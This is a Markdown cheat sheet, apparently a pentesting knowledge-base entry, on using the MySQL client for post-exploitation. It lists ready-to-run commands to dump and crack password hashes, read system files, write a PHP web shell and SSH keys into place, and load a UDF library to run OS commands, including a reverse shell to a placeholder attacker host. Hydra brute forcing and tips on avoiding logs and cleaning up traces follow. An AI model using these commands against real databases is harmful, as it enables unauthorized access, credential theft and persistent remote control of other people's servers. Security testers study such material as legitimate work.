# mysql

**Tags:** `#mysql` `#database` `#postexploitation` `#enumeration` `#rce` `#credentialdumping`

Standard MySQL/MariaDB CLI client — connects to MySQL instances for interactive sessions. Post-exploitation uses: enumerate databases and credentials, extract password hashes from `mysql.user`, read/write files via `LOAD DATA INFILE` / `SELECT INTO OUTFILE`, and escalate to OS command execution via User Defined Functions (UDFs). Pre-installed on Kali.

**Source:** Pre-installed on Kali (`mysql` / `mariadb-client`)
**Install:** `sudo apt install default-mysql-client`

```bash
# Connect
mysql -u root -p -h 192.168.1.10

# Connect with password inline (scripting)
mysql -u root -pPassword -h 192.168.1.10
```

> [!note] **mysql vs SQLMap** — SQLMap is for web-based SQLi discovery and extraction. The `mysql` client is for direct database access once you have credentials or a direct network path to port 3306. Use mysql for post-exploitation and manual enumeration; SQLMap for automated web injection exploitation.

---

## Connecting

```bash
# Remote connection
mysql -u root -p -h 192.168.1.10
mysql -u root -pPassword -h 192.168.1.10 -P 3306

# Local socket connection
mysql -u root -p

# Connect to specific database
mysql -u root -pPassword -h 192.168.1.10 targetdb

# Execute single query and exit
mysql -u root -pPassword -h 192.168.1.10 -e "SELECT user();"

# Read queries from file
mysql -u root -pPassword -h 192.168.1.10 < queries.sql

# Suppress banner (cleaner output for scripting)
mysql -u root -pPassword -h 192.168.1.10 -s -e "SELECT user, password FROM mysql.user;"
```

---

## Reconnaissance

```sql
-- Current user and privileges
SELECT user();
SELECT current_user();
SHOW GRANTS;

-- MySQL version
SELECT @@version;
SELECT version();

-- Hostname and data directory
SELECT @@hostname;
SELECT @@datadir;

-- List all databases
SHOW DATABASES;

-- List tables
USE targetdb;
SHOW TABLES;

-- Describe table structure
DESCRIBE users;

-- List all users
SELECT user, host FROM mysql.user;

-- Dump password hashes
SELECT user, authentication_string, host FROM mysql.user;

-- Check file privileges (required for LOAD DATA / SELECT INTO OUTFILE)
SELECT user, File_priv FROM mysql.user WHERE user = 'root';

-- Check secure_file_priv (restricts file read/write path — empty = unrestricted)
SELECT @@secure_file_priv;
```

---

## Credential Extraction

```sql
-- MySQL 5.7+ — authentication_string column
SELECT user, authentication_string FROM mysql.user;

-- MySQL 5.6 and earlier — password column
SELECT user, password FROM mysql.user;

-- Full user dump
SELECT user, host, authentication_string, plugin FROM mysql.user;
```

```bash
# Crack MySQL hashes
# MySQL 4.x (short hash) — hashcat mode 200
# MySQL 5.x ($mysql$hash) — hashcat mode 300
# MySQL sha256 ($A$005$) — hashcat mode 7401

hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## File Read

```sql
-- Read local file (requires FILE privilege, path must be in secure_file_priv or it be empty)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Read into table
CREATE TABLE filecontent (data TEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE filecontent FIELDS TERMINATED BY '\n';
SELECT * FROM filecontent;
```

---

## File Write — Web Shell

```sql
-- Write file (requires FILE privilege + write access to path)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- Write SSH authorized_keys (if MySQL runs as root and /root/.ssh exists)
SELECT "ssh-rsa AAAAB3N..." INTO OUTFILE '/root/.ssh/authorized_keys';

-- Check web root (find writable paths)
SHOW VARIABLES LIKE 'datadir';
```

---

## OS Command Execution — UDF

User Defined Functions allow OS command execution when MySQL runs with sufficient privileges.

```bash
# Find the UDF exploit — pre-compiled lib on Kali
locate lib_mysqludf_sys.so
# Typically: /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
```

```sql
-- Step 1: Write the UDF shared library to plugin directory
SELECT @@plugin_dir;   -- find plugin dir
SELECT LOAD_FILE('/tmp/lib_mysqludf_sys_64.so') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Step 2: Create the function
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- Step 3: Execute OS commands
SELECT sys_exec('id > /tmp/out.txt');
SELECT sys_eval('whoami');
SELECT sys_eval('bash -i >& /dev/tcp/ATTACKER/4444 0>&1');

-- Cleanup
DROP FUNCTION sys_exec;
DROP FUNCTION sys_eval;
```

> [!warning] UDF exploitation requires `FILE` privilege, write access to the plugin directory, and MySQL running as root or a privileged account. Most effective against misconfigured dev/legacy instances.

---

## Useful One-Liners

```bash
# Dump all databases to file
mysqldump -u root -pPassword -h 192.168.1.10 --all-databases > dump.sql

# Dump specific database
mysqldump -u root -pPassword -h 192.168.1.10 targetdb > targetdb.sql

# Quick hash dump from CLI
mysql -u root -pPassword -h 192.168.1.10 -s -e \
  "SELECT user,authentication_string FROM mysql.user;" mysql

# Check for anonymous login
mysql -u '' -h 192.168.1.10 -e "SELECT user();"

# Brute force with Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.10
```

---

## OPSEC Notes

- MySQL general query log (`general_log`) records all queries if enabled — check with `SHOW VARIABLES LIKE 'general_log%';`
- Writing files leaves artifacts on disk — clean up web shells after use
- UDF `.so` file write to plugin dir is a strong indicator of compromise
- Default MySQL port 3306 — binding on `0.0.0.0` is a misconfiguration, check with `SELECT @@bind_address;`

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
